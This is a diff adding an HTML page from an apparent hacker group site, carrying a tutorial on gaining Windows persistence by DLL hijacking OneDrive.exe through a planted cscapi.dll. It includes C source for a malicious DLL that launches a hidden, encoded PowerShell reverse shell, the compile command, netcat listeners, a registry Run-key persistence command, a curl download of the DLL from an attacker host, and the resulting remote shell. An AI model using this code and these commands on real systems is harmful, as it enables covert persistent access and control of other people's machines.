@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+    <title>Paper: ─────────[ ★  P3rs1st3nc3 W1th DLL H1j4ck1ng F0r fun 4nd Pr0f1t ★ ]───────── - Amolo</title>
+
+    <style>
+    @font-face {
+        font-family: 'EnglishTowne';
+        src: url('../../../fonts/EnglishTowne.ttf') format('truetype');
+    }
+
+    body {
+        background-image: url('../../../imgs/bg.png');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-attachment: fixed;
+        margin: 0;
+        padding: 0;
+    }
+
+    .ascii {
+        color: white;
+        padding: 30px;
+        text-align: center;
+        font-family: 'EnglishTowne', cursive;
+        font-size: 90px;
+    }
+
+    .nav {
+        display: flex;
+        justify-content: center;
+        background-color: rgba(5, 5, 5, 0.8);
+        gap: 10px;
+        padding: 10px 0;
+    }
+
+    .nav a {
+        color: white;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-family: monospace;
+    }
+
+    .nav a:hover {
+        background-color: rgb(38, 7, 112);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .nav a.active {
+        background-color: rgb(71, 37, 153);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .card {
+        color: #000;
+        background-color: #aaa;
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .pre-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    pre {
+		background-color: #1e1e1e40;
+		color: white;
+		padding: 20px 30px;
+		border-radius: 10px;
+		box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+		width: 90%;
+		max-width: 1200px;
+		margin: 0 auto;
+		overflow-x: auto;
+		white-space: pre-wrap;
+		font-family: monospace;
+
+		border: 2px solid rgba(255, 255, 255, 0.75);
+		box-sizing: border-box;
+
+		text-indent: 0;
+		word-break: break-word;
+	}
+    </style>
+</head>
+
+<body>
+    <div class="nav">
+        <a href="../../index.html">❮─❲Home❳─❯</a>
+        <a href="../../papers/" class="active">❮─❲✧Papers✧❳─❯</a>
+        <a href="../../members/">❮─❲Members❳─❯</a>
+    </div>
+
+    <div class="ascii">
+        Amolo ☽
+    </div>
+
+    <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">
+        ─────────[ ★  P3rs1st3nc3 W1th DLL H1j4ck1ng F0r fun 4nd Pr0f1t ★ ]─────────
+    </h1>
+    <p style="line-height: normal; margin:unset; padding:unset; margin-bottom: 20px; font-family:monospace; text-align:center; color:white;">
+		Author: @ferreiraklet
+	</p>
+
+    <div class="pre-container">
+        <pre>
+─────────[ ★  l33t's g00 ★ ]─────────
+
+  ,-.       _,---._ __  / \
+ /  )    .-'       `./ /   \
+(  (   ,'            `/    /|
+ \  `-"             \'\   / |
+  `.              ,  \ \ /  |
+   /`.          ,'-`----Y   |
+  (            ;        |   '
+  |  ,-.    ,-'         |  /
+  |  | (   |  @ferreira | /
+  )  |  \  `.___________|/
+  `--'   `--'
+
+
+
+               ★★★★★★
+┌───────────────Summary────────────────┐
+│                                      │
+│  1. Concept                          │
+│     - What is a DLL                  │
+│     - What is DLL hijacking          │
+│     - Finding non-existent DLL       │
+│     - Exploiting native Win exe      │
+│  2. Creating DLL                     │
+│  3. H4nds 0n:                        │
+│      - Reverse Shell                 │
+│      - Gathering Information         │
+│      - reg add                       │
+│                                      │
+└──────────────────────────────────────┘
+
+
+<b style="color:red;">──[ Concept ]──</b>
+
+<b>What is a DLL?</b>
+
+DLL, or "Dynamic Link Library", is a feature created by Windows, a dynamic library that serves to store code, data, or resources used by executables.  
+We can generate a DLL with C code. This will be discussed in the next chapter.
+
+<b>What is DLL hijacking?</b>
+
+DLL Hijacking, although it may seem like a complex technique, is simpler than it appears.  
+This technique consists of hijacking a DLL (existing or non-existing), replacing a DLL, or inserting code into an existing DLL so that, when the executable responsible for it runs, it will call the DLL with our malicious code inserted.
+
+<b>Finding a non-existent DLL</b>
+
+As mentioned earlier, it is also possible to inject code into existing DLLs. However, I will not cover this technique in this paper, as it would make the paper too long and introduce possible risks of breaking some DLL.
+
+Therefore, the approach will be to find a non-existent DLL. To find a call to a non-existent DLL, we can use Procmon, known as Process Monitor.  
+- Process Monitor is a Microsoft tool, download link: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
+
+After opening Procmon, we first need to apply a filter specifying the .exe we want to monitor:  
+- Click on the Filter tab -> Filter -> Next to "is", enter the name of the executable, select the "include" option, and finish by clicking OK.  
+- Now Procmon will only monitor the mentioned process.  
+- Open the executable and look for DLL calls; if you find any DLL called by the executable that does not exist, "x.DLL NOT FOUND", the attack can be carried out.
+
+The .exe can be any, as long as it looks for a non-existent DLL. We can abuse this to gain persistence on other machines that have this same .exe.
+
+<b>Exploiting a native Windows executable</b>
+
+You’ve probably already seen OneDrive, that little program that starts with Windows and annoys you, making you close it every time Windows boots up.
+
+In this paper, persistence will be achieved by targeting OneDrive.exe, because it makes a call to a DLL that does not exist in its directory.  
+Thus, we will create a DLL with the same name as the one the "OneDrive.exe" calls, which will trigger our malicious payload when it runs.
+
+The DLL that OneDrive.exe calls is "cscapi.DLL"  
+However, if you check, it does not exist in its local directory.  
+Therefore, we will create a DLL with malicious code and place it in its local directory.
+
+<b style="color:red;">──[ Creating the Malicious DLL ]──</b>
+
+
+!kl@ferreira ~/papers$ cat DLL.c
+
+#include <windows.h>
+
+BOOL WINAPI
+DLLMain (HANDLE hDLL, DWORD dwReason, LPVOID lpReserved)
+
+{
+    switch (dwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            //MessageBox(NULL, "test", "test2", MB_ICONERROR | MB_OK); message box with test message
+            system("powershell -nop -w hidden -ep bypass -enc JABKACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAG...");
+            break;
+    }
+return TRUE;
+}
+
+
+Inside the system() function, insert your payload for the reverse shell  
+Notes:  
+  - The inserted payload contains the IP 192.168.1.7 as LHOST  
+  - 80 as LPORT  
+
+<b>Compiling the DLL</b>  
+!kl@ferreira ~/papers$ x86_64-w64-mingw32-gcc-win32 DLL.c -o cscapi.DLL -shared  
+
+<b style="color:red;">──[ H4nds 0n ]──</b>  
+
+First, let's get a shell on Windows as the initial access.
+
+
+!k@ferreira ~/papers$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.1.7] from (UNKNOWN) [192.168.1.3] 29418
+Copyright (C) 2022 Microsoft Corporation. All rights reserved.
+
+C:\Users\ferreira>
+
+<b>Workflow</b>:  
+  1. Execute the payload with reg add so that OneDrive.exe is always executed on the machine when the user logs in  
+  2. Place our DLL named "cscapi.DLL" in the OneDrive folder  
+  3. Run OneDrive.exe (close it first if it is already open)  
+  4. B00m!!  
+
+C:\Users\ferreira>powershell -c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Onedrive2 /t REG_SZ /d "C:\Users\ferreira\AppData\Local\Microsoft\OneDrive\OneDrive.exe"  
+The operation completed successfully.  
+
+Now, we need to download our DLL and send it to the OneDrive folder
+
+
+C:\Users\ferreira>cd C:\Users\ferreira\AppData\Local\Microsoft\OneDrive\
+C:\Users\ferreira\AppData\Local\Microsoft\Onedrive>cmd.exe /c "curl 192.168.1.7:80/cscapi.DLL --output cscapi.DLL"
+
+C:\Users\ferreira\AppData\Local\Microsoft\OneDrive> dir
+
+
+    Diretório: C:\Users\ferreira\AppData\Local\Microsoft\OneDrive
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        27/01/2023     15:26                23.007.0109.0004
+d-----        27/01/2023     15:26                EBWebView
+d-----        25/10/2021     22:46                ListSync
+d-----        27/01/2023     15:26                LogoImages
+d-----        25/10/2021     22:46                logs
+d-----        14/10/2020     09:47                settings
+d-----        18/08/2020     07:50                setup
+d-----        25/01/2023     15:41                StandaloneUpdater
+d-----        28/01/2023     11:10                Update
+-a----        28/01/2023     12:29          87028 cscapi.DLL
+-a----        27/01/2023     15:26        2627968 OneDrive.exe
+-a----        27/01/2023     15:26            344 OneDrive.VisualElementsManifest.xml
+-a----        27/01/2023     15:26        4184976 OneDriveStandaloneUpdater.exe
+-a----        27/01/2023     15:26       18671464 Resources.pri
+
+
+We will run OneDrive ->
+
+C:\Users\ferreira\AppData\Local\Microsoft\OneDrive>start OneDrive.exe
+
+!kl@ferreira ~/papers$ nc -lnvp 80
+listening on [any] 80 ...
+connect to [192.168.1.7] from (UNKNOWN) [192.168.1.3] 1410
+Copyright (C) 2022 Microsoft Corporation. All rights reserved.
+
+C:\Users\ferreira\AppData\Local\Microsoft\OneDrive>
+
+B00m!! pwn3d w1th DLL h1j4ck1ng
+
+Gr33tz f0r 4ll
+
+END
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⡏⡆⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠛⠋⠉⠉⠉⠈⠉⠛⠛⢳⡇⠀
+⠀⠀⠀⠀⠀⢀⠞⠋⠀⠀⣷⣤⣀⣀⣀⠀⠀⠀⠀⠸⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣢⠄⠀⠀⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⡀⠀⠀⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇⠀⣀⣇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣧⣴⣾⣻⡆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣭⣾⣿⣿⣿⠉⣛⢿⠿⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣷⣶⣿⣻⣿⣆⠙⣿⠀⠀     "H4ck f0r l1v1ng" - ferreira
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⣸⣔⣿⣿⡄⣿⠀⠀
+⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⡏⠀⠀
+⠐⠶⠶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⢤⢤⠤⡤⡤⠄⢠⣤⡄⠠⠄⡤⣤⣤⡠⠄
+                </pre>                    
+        </div>
+    </body>
+</html>
